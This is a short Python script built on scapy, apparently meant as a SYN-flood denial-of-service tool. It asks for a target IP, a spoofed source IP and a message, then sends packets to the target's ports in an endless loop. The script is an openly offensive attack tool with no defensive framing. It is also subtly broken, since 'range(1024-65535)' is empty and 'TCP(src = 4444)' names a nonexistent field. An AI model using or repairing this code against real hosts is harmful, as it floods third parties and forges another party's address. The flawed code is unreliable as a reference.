#!/usr/bin/env python3
from scapy.all import *

def synFlood(src, tgt, msg):

    for dport in range(1024-65535):
        ipLayer = IP(src = src, dst = tgt)
        tcpLayer = TCP(src = 4444, dport = dport)
        rawLayer = Raw(load = msg)
        packet = ipLayer / tcpLayer / rawLayer
        send(packet)

def main():

    target = input('Enter a target IP: ')
    source = input('Enter a source IP: ')
    message = input('Enter a message: ')

    while True:
            synFlood(source, target, message)

main()
    